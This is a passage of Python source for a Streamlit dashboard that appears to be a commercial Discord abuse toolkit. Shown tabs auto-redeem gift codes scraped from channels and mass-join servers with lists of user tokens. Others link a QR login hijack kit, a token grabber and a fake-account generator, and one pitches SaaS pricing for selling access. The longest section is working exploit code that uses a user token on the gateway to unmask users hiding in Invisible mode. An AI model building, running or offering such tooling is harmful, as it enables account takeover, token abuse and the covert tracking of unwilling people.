                                            if msg_r.status_code == 200:
                                                for m in msg_r.json():
                                                    content = m.get("content", "")
                                                    if "discord.gift/" in content or "discord.com/gifts/" in content:
                                                        gm = re.search(r'(?:discord\\.gift/|discord\\.com/gifts/)([a-zA-Z0-9]+)', content)
                                                        if gm and auto_claim:
                                                            cr = requests.post(f"https://discord.com/api/v9/entitlements/gift-codes/{gm.group(1)}/redeem", headers=get_headers(tok), json={"channel_id": ch["id"]}, timeout=8)
                                                            if cr.status_code == 200:
                                                                st.success(f"🎉 NITRO: {gm.group(1)}")
                                    time.sleep(0.3)
                    except:
                        pass
                time.sleep(2)
                log_to_console(f"💎 Scan #{scan_count} complete.")
                st.rerun()
    if st.button("🛑 Stop Nitro Sniper", use_container_width=True):
        st.session_state.nitro_sniper_running = False
        st.rerun()


with tabs[36]:
    st.header("📝 Message Logger")
    logger_ch = st.text_input("Channel ID to Log", value=st.session_state.channel_id, key="logger_ch")
    log_limit = st.number_input("Fetch count", min_value=10, max_value=200, value=50)
    if st.button("🔍 Fetch & Log Messages", use_container_width=True):
        if not st.session_state.discord_token or not logger_ch:
            st.error("Token and channel ID required.")
        else:
            h = get_headers(st.session_state.discord_token)
            r = requests.get(f"https://discord.com/api/v9/channels/{logger_ch}/messages?limit={log_limit}", headers=h, timeout=8)
            if r.status_code == 200:
                log_entries = [{"ID": m["id"], "Author": m["author"]["username"], "Author ID": m["author"]["id"], "Content": m.get("content", "")[:200], "Timestamp": m.get("timestamp", ""), "Edited": m.get("edited_timestamp", "—"), "Attachments": len(m.get("attachments", []))} for m in r.json()]
                st.session_state.logged_messages = log_entries
                st.success(f"Logged {len(log_entries)} messages.")
    if st.session_state.logged_messages:
        df = pd.DataFrame(st.session_state.logged_messages)
        st.dataframe(df, use_container_width=True)
        st.download_button("📥 Export Log (CSV)", data=df.to_csv(index=False), file_name=f"message_log_{logger_ch}.csv", mime="text/csv")


with tabs[37]:
    st.header("📦 Guild Backup & Restore")
    col1, col2 = st.columns(2)
    with col1:
        backup_guild_id = st.text_input("Server ID to Backup", key="backup_guild")
        if st.button("📤 Export Full Backup", use_container_width=True):
            if not st.session_state.discord_token or not backup_guild_id:
                st.error("Token and guild ID required.")
            else:
                h = get_headers(st.session_state.discord_token)
                with st.spinner("Exporting..."):
                    guild = requests.get(f"https://discord.com/api/v9/guilds/{backup_guild_id}", headers=h, timeout=10).json()
                    channels = requests.get(f"https://discord.com/api/v9/guilds/{backup_guild_id}/channels", headers=h, timeout=10).json()
                    roles = requests.get(f"https://discord.com/api/v9/guilds/{backup_guild_id}/roles", headers=h, timeout=10).json()
                    emojis = requests.get(f"https://discord.com/api/v9/guilds/{backup_guild_id}/emojis", headers=h, timeout=10).json()
                    invites = requests.get(f"https://discord.com/api/v9/guilds/{backup_guild_id}/invites", headers=h, timeout=10).json()
                    st.session_state.backup_data = {"guild": guild, "roles": roles, "channels": channels, "emojis": emojis, "invites": invites, "backup_timestamp": datetime.now().isoformat()}
                    st.success(f"Backup complete — {len(channels)} channels, {len(roles)} roles.")
        if st.session_state.backup_data:
            st.download_button("📥 Download Backup JSON", data=json.dumps(st.session_state.backup_data, indent=2), file_name=f"guild_backup_{backup_guild_id}.json", mime="application/json")
    with col2:
        st.subheader("Restore")
        restore_file = st.file_uploader("Upload Backup JSON", type=["json"], key="restore_file")
        restore_guild_id = st.text_input("Target Server ID", key="restore_guild")
        if st.button("📥 Restore Backup", use_container_width=True):
            if not restore_file or not restore_guild_id or not st.session_state.discord_token:
                st.error("All fields required.")
            else:
                try:
                    backup = json.loads(restore_file.read())
                    h = get_headers(st.session_state.discord_token)
                    with st.spinner("Restoring..."):
                        for role in backup.get("roles", []):
                            if role.get("name") == "@everyone":
                                continue
                            requests.post(f"https://discord.com/api/v9/guilds/{restore_guild_id}/roles", headers=h, json={"name": role["name"], "permissions": role.get("permissions", "0"), "color": role.get("color", 0), "hoist": role.get("hoist", False), "mentionable": role.get("mentionable", False)}, timeout=10)
                            time.sleep(0.5)
                        for ch in backup.get("channels", []):
                            requests.post(f"https://discord.com/api/v9/guilds/{restore_guild_id}/channels", headers=h, json={"name": ch["name"], "type": ch["type"], "position": ch.get("position", 0), "topic": ch.get("topic"), "nsfw": ch.get("nsfw", False)}, timeout=10)
                            time.sleep(0.5)
                        st.success("Restore complete.")
                except Exception as e:
                    st.error(f"Restore failed: {e}")


with tabs[38]:
    st.header("🔗 Token Joiner (Mass Join)")
    join_invite = st.text_input("Invite Code or URL", key="join_invite", placeholder="discord.gg/abc123")
    join_tokens = st.text_area("Tokens (one per line)", height=150, key="join_tokens")
    join_delay = st.slider("Delay between joins (seconds)", 0.5, 10.0, 2.0, key="join_delay")
    if st.button("🚀 Join All Tokens", use_container_width=True):
        if not join_invite.strip() or not join_tokens.strip():
            st.error("Invite and tokens required.")
        else:
            code = join_invite.strip()
            if "discord.gg/" in code:
                code = code.split("discord.gg/")[-1].split("/")[0].split("?")[0]
            elif "discord.com/invite/" in code:
                code = code.split("discord.com/invite/")[-1].split("/")[0].split("?")[0]
            token_list = [t.strip() for t in join_tokens.split("\n") if t.strip()]
            results = []
            progress = st.progress(0.0)
            for idx, tok in enumerate(token_list):
                try:
                    r = requests.post(f"https://discord.com/api/v9/invites/{code}", headers=get_headers(tok), json={}, timeout=8)
                    if r.status_code == 200:
                        results.append({"Token": tok[:20] + "...", "Status": "✅ Joined"})
                    elif r.status_code == 429:
                        ra = r.json().get("retry_after", 5)
                        results.append({"Token": tok[:20] + "...", "Status": f"⏳ Rate limited ({ra}s)"})
                        time.sleep(ra)
                    else:
                        results.append({"Token": tok[:20] + "...", "Status": f"❌ {r.status_code}"})
                except Exception as e:
                    results.append({"Token": tok[:20] + "...", "Status": f"⚠️ {str(e)[:30]}"})
                progress.progress((idx + 1) / len(token_list))
                time.sleep(join_delay)
            st.session_state.join_results = results
            st.success(f"{sum(1 for r in results if 'Joined' in r['Status'])}/{len(results)} tokens joined.")
    if st.session_state.join_results:
        st.dataframe(pd.DataFrame(st.session_state.join_results), use_container_width=True)


with tabs[39]:
    st.header("🧅 Tor Token Manager — Guide")
    with st.expander("📥 Setup Guide", expanded=True):
        st.markdown("**Repo:** [github.com/Kurama250/Discord_token_manager](https://github.com/Kurama250/Discord_token_manager)\n\nInstall Tor, launch Token Manager, toggle 'Use Tor' per account. Routes via `127.0.0.1:9050`.")


with tabs[40]:
    st.header("📱 QR Login Hijack Kit — Guide")
    st.error("⚠️ Social engineering attack. Red team research only.")
    with st.expander("🛠️ Attack Flow"):
        st.markdown("**PoC:** [github.com/9P9/Discord-QR-Token-Logger](https://github.com/9P9/Discord-QR-Token-Logger)\n\nNever scan Discord QR codes from untrusted sources.")


with tabs[41]:
    st.header("🤖 Android Account Generator — Guide")
    st.error("⚠️ Violates Discord ToS. Research only.")
    with st.expander("🔬 Technical Overview"):
        st.markdown("**Repo:** [github.com/SerialHooker/Fitna-Token-Gen](https://github.com/SerialHooker/Fitna-Token-Gen)\n\nJava 17+, Android emulator, proxy required.")


with tabs[42]:
    st.header("🎤 Real-Time RVC Voice Changer — Guide")
    with st.expander("📥 Setup", expanded=True):
        st.markdown("**Tool:** [meloie](https://github.com/sstina/meloie)\n\n**Pipeline:** Mic → RVC → VB-CABLE → Discord")


with tabs[43]:
    st.header("☢️ Server Termination 0-Day — Research Only")
    st.error("🚫 **DO NOT USE.** Documentation only.")
    with st.expander("🔍 Threat Summary"):
        st.markdown("100+ servers terminated, one 230k-member partnered server. Unpatched April 2026.")


with tabs[44]:
    st.header("🕵️ Token Grabber — Research Guide")
    st.error("⚠️ Malware. Research surface only.")
    with st.expander("🔬 Technical Breakdown"):
        st.markdown("**Repo:** [github.com/itzzkirito/Token-Grabber](https://github.com/itzzkirito/Token-Grabber)")


with tabs[45]:
    st.header("💰 Client Manager & Monetization")
    clients = st.session_state.clients
    with st.form("add_client"):
        col1, col2 = st.columns(2)
        with col1:
            client_name = st.text_input("Client Name")
            client_discord = st.text_input("Discord Tag")
        with col2:
            client_plan = st.selectbox("Plan", ["Basic — $10/mo", "Pro — $25/mo", "Enterprise — $50/mo"])
            client_notes = st.text_input("Notes")
        submitted = st.form_submit_button("Add Client")
        if submitted and client_name:
            api_key = f"dsc_{random.randint(10000000, 99999999)}_{random.randint(1000, 9999)}"
            clients[api_key] = {"name": client_name, "discord": client_discord, "plan": client_plan, "notes": client_notes, "created": datetime.now().isoformat(), "active": True}
            save_clients(clients)
            st.success(f"Client added — API Key: `{api_key}`")
            st.rerun()
    if clients:
        st.divider()
        df_data = [{"API Key": k[:12] + "...", "Name": c["name"], "Discord": c["discord"], "Plan": c["plan"], "Active": "✅" if c.get("active") else "❌", "Created": c["created"][:10]} for k, c in clients.items()]
        st.dataframe(pd.DataFrame(df_data), use_container_width=True)
        total_mrr = sum({"Basic — $10/mo": 10, "Pro — $25/mo": 25, "Enterprise — $50/mo": 50}.get(c["plan"], 0) for c in clients.values() if c.get("active"))
        st.metric("Monthly Recurring Revenue", f"${total_mrr}")
        st.metric("Active Clients", sum(1 for c in clients.values() if c.get("active")))


with tabs[46]:
    st.header("🚀 Deployment & Client Acquisition Guide")
    with st.expander("☁️ Hosting Options", expanded=True):
        st.markdown("| Platform | Cost | Pros |\n|---|---|---|\n| Streamlit Cloud | Free | Instant deploy |\n| Railway | $5/mo | Persistent |\n| Render | Free tier | GitHub integration |\n| Hetzner VPS | €4/mo | Full control |")
    with st.expander("🎯 Client Acquisition Channels"):
        st.markdown("- Discord server owner communities\n- r/discordapp, r/Discord_Bots\n- Twitter/X server backup testimonials\n- YouTube tutorials\n- Fiverr / Upwork gigs")
    with st.expander("📈 SaaS Pricing Tiers"):
        st.markdown("| Tier | Price | Features |\n|---|---|---|\n| Free | $0 | 1-token checker, guild scraper |\n| Basic | $10/mo | 10 tokens, vanity sniper |\n| Pro | $25/mo | 50 tokens, all snipers |\n| Enterprise | $50/mo | Unlimited, API |\n| Agency | $200/mo | White-label |")


st.divider()
st.subheader("📟 Live Operational Control Terminal Console")
console_container = st.empty()
with console_container.container():
    st.code("\n".join(st.session_state.console_logs), language="text")
# ================= TAB 47: INVISIBLE DETECTOR =================
with tabs[47]:
    st.header("👁️ CVE-2026-24332 — Invisible Mode Detector")
    st.caption("Unpatched privacy leak. Discord's WebSocket gateway includes Invisible users in the `presences` array with `status: \"offline\"`, while genuinely offline users are omitted entirely. This tab exploits that discrepancy to confirm whether a target is actually online behind Invisible mode.")

    st.error("⚠️ **Information disclosure only.** No ATO, no credential access. Discord has not patched this as of the latest advisory.")

    col1, col2 = st.columns(2)
    with col1:
        inv_token = st.text_input("Discord Token (account doing the sniffing)", type="password", key="inv_token")
        inv_target = st.text_input("Target User ID (the Invisible one)", key="inv_target", placeholder="123456789012345678")
    with col2:
        inv_guild = st.text_input("Shared Guild ID (both accounts must be in this server)", key="inv_guild", placeholder="123456789012345678")
        inv_duration = st.slider("Monitor duration (seconds)", 5, 120, 30)

    inv_poll = st.slider("Re-check interval (seconds)", 1, 30, 5)

    col_a, col_b = st.columns(2)
    with col_a:
        start_inv = st.button("🔍 Start Invisible Detector", use_container_width=True)
    with col_b:
        stop_inv = st.button("🛑 Stop Detector", use_container_width=True)

    if "invisible_detector_running" not in st.session_state:
        st.session_state.invisible_detector_running = False
    if "invisible_results" not in st.session_state:
        st.session_state.invisible_results = []

    if stop_inv:
        st.session_state.invisible_detector_running = False
        log_to_console("👁️ Invisible detector stopped.")
        st.rerun()

    if start_inv:
        if not inv_token or not inv_target or not inv_guild:
            st.error("Token, target user ID, and shared guild ID are required.")
        else:
            st.session_state.invisible_detector_running = True
            st.session_state.invisible_results = []
            log_to_console(f"👁️ Invisible detector armed for target {inv_target} in guild {inv_guild}.")

            import websocket
            import threading

            GATEWAY = "wss://gateway.discord.gg/?v=9&encoding=json"
            TARGET = str(inv_target).strip()
            GUILD = str(inv_guild).strip()
            TOKEN = inv_token.strip()
            DURATION = inv_duration
            POLL = inv_poll

            # ---------- inline websocket listener ----------
            def _inv_on_open(ws):
                log_to_console("👁️ Gateway connection opened.")

            def _inv_on_message(ws, message):
                try:
                    data = json.loads(message)
                except:
                    return

                op = data.get("op")

                # Hello -> send heartbeat + identify
                if op == 10:
                    hb_interval = data["d"]["heartbeat_interval"] / 1000.0
                    threading.Thread(target=_inv_heartbeat, args=(ws, hb_interval), daemon=True).start()
                    identify_payload = {
                        "op": 2,
                        "d": {
                            "token": TOKEN,
                            "properties": {
                                "$os": "windows",
                                "$browser": "chrome",
                                "$device": "pc",
                            },
                            "compress": False,
                            "large_threshold": 250,
                        },
                    }
                    ws.send(json.dumps(identify_payload))
                    log_to_console("👁️ Identify sent.")

                # Dispatch events
                if op == 0:
                    t = data.get("t")
                    d = data.get("d", {})

                    # GUILD_CREATE -> inspect presences array
                    if t == "GUILD_CREATE" and str(d.get("id")) == GUILD:
                        presences = d.get("presences", [])
                        found = False
                        for p in presences:
                            uid = str(p.get("user", {}).get("id", ""))
                            status = p.get("status")
                            if uid == TARGET and status == "offline":
                                found = True
                                entry = {
                                    "timestamp": datetime.now().strftime("%H:%M:%S"),
                                    "event": "GUILD_CREATE",
                                    "status": status,
                                    "verdict": "🔴 INVISIBLE (actually online)",
                                }
                                st.session_state.invisible_results.append(entry)
                                log_to_console(f"👁️ TARGET {TARGET} found in presences with status=offline -> INVISIBLE.")
                                break
                            elif uid == TARGET:
                                found = True
                                entry = {
                                    "timestamp": datetime.now().strftime("%H:%M:%S"),
                                    "event": "GUILD_CREATE",
                                    "status": status,
                                    "verdict": f"🟢 VISIBLE ({status})",
                                }
                                st.session_state.invisible_results.append(entry)
                                log_to_console(f"👁️ TARGET {TARGET} visible as {status}.")
                                break
                        if not found:
                            entry = {
                                "timestamp": datetime.now().strftime("%H:%M:%S"),
                                "event": "GUILD_CREATE",
                                "status": "absent",
                                "verdict": "⚫ OFFLINE (not in presences)",
                            }
                            st.session_state.invisible_results.append(entry)
                            log_to_console(f"👁️ TARGET {TARGET} absent from presences -> OFFLINE.")

                    # PRESENCE_UPDATE -> live tracking
                    if t == "PRESENCE_UPDATE":
                        uid = str(d.get("user", {}).get("id", ""))
                        status = d.get("status")
                        if uid == TARGET:
                            if status == "offline":
                                verdict = "🔴 INVISIBLE (actually online)"
                                log_to_console(f"👁️ PRESENCE_UPDATE: target {TARGET} status=offline -> INVISIBLE.")
                            else:
                                verdict = f"🟢 VISIBLE ({status})"
                                log_to_console(f"👁️ PRESENCE_UPDATE: target {TARGET} status={status}.")
                            st.session_state.invisible_results.append({
                                "timestamp": datetime.now().strftime("%H:%M:%S"),
                                "event": "PRESENCE_UPDATE",
                                "status": status,
                                "verdict": verdict,
                            })

            def _inv_heartbeat(ws, interval):
                while st.session_state.invisible_detector_running:
                    try:
                        ws.send(json.dumps({"op": 1, "d": None}))
                    except:
                        break
                    time.sleep(interval)

            def _inv_on_error(ws, error):
                log_to_console(f"👁️ WebSocket error: {error}")

            def _inv_on_close(ws, code, msg):
                log_to_console(f"👁️ Gateway closed: {code} {msg}")

            def _inv_run():
                ws = websocket.WebSocketApp(
                    GATEWAY,
                    on_open=_inv_on_open,
                    on_message=_inv_on_message,
                    on_error=_inv_on_error,
                    on_close=_inv_on_close,
                )
                ws.run_forever()

            # start listener thread
            listener = threading.Thread(target=_inv_run, daemon=True)
            listener.start()

            # monitor window
            start_time = time.time()
            monitor = st.empty()
            while st.session_state.invisible_detector_running and (time.time() - start_time) < DURATION:
                elapsed = int(time.time() - start_time)
                monitor.info(f"Monitoring... {elapsed}s / {DURATION}s — {len(st.session_state.invisible_results)} event(s) captured.")
                time.sleep(POLL)

            st.session_state.invisible_detector_running = False
            monitor.empty()
            log_to_console("👁️ Monitor window ended.")

    # ---------- results ----------
    if st.session_state.invisible_results:
        st.divider()
        st.subheader("📊 Detection Results")
        df = pd.DataFrame(st.session_state.invisible_results)
        st.dataframe(df, use_container_width=True)

        invisible_hits = sum(1 for r in st.session_state.invisible_results if "INVISIBLE" in r["verdict"])
        online_hits = sum(1 for r in st.session_state.invisible_results if "VISIBLE" in r["verdict"])
        offline_hits = sum(1 for r in st.session_state.invisible_results if "OFFLINE" in r["verdict"])

        c1, c2, c3 = st.columns(3)
        c1.metric("🔴 Invisible", invisible_hits)
        c2.metric("🟢 Visible", online_hits)
        c3.metric("⚫ Offline", offline_hits)

        if invisible_hits > 0:
            st.error("🔴 **Target confirmed INVISIBLE.** They are online but hiding. This is the CVE-2026-24332 leak.")
        elif online_hits > 0:
            st.success("🟢 Target is visibly online with a public status.")
        else:
            st.info("⚫ Target appears genuinely offline — absent from the presences array.")

    st.divider()
    with st.expander("ℹ️ How this works / requirements"):
        st.markdown(
            """
**CVE-2026-24332 — Invisible Mode Presence Leak**

- CVSS: **4.3 Medium** — CWE-204 (Observable Response Discrepancy)
- Status: **Unpatched** as of latest advisory
- Impact: **Information disclosure only** — privacy bypass, activity tracking

**The discrepancy:**
- Users set to **Invisible** appear in the gateway `presences` array with `"status": "offline"`
- Users who are **genuinely offline** are **omitted entirely** from the array
- Therefore: if the target is in the array with `status: "offline"`, they are actually online but hiding

**Requirements:**
- Your token must be in a **shared guild** with the target
- Your account needs the `GUILD_PRESENCES` intent (user accounts typically have this by default)
- Gateway v9 or v10 — both exhibit the leak

**Detection flow:**
1. Connect to `wss://gateway.discord.gg/?v=9&encoding=json`
2. Send Op 2 (Identify) with your token
3. Capture `GUILD_CREATE` for the shared guild → inspect `presences[]`
4. Listen for live `PRESENCE_UPDATE` events
5. Match target ID against the array

**Limitations:**
- Only works for users sharing a guild with your token
- If the target never triggers a presence update during your monitor window, only the `GUILD_CREATE` snapshot is available
- Discord may patch this at any time

**PoC reference:** [github.com/0cqb/CVE-2026-24332](https://github.com/0cqb/CVE-2026-24332)
            """
        )
